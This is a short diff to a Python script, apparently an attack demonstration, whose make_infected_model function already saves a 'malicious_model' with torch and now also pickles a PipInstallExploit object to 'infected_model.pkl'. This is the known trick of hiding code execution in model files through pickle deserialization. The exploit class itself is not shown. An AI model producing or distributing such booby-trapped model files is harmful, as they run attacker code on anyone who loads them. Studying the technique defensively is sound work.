@@ -1,3 +1,5 @@
+import pickle
+
 import pip
 import torch
 
@@ -17,7 +19,7 @@ def make_infected_model():
 
     # Save the malicious model as a new file
     torch.save(malicious_model, "infected_model.bin")
-
+    pickle.dump(PipInstallExploit(), open("infected_model.pkl", "wb"))
 
 if __name__ == "__main__":
     make_infected_model()
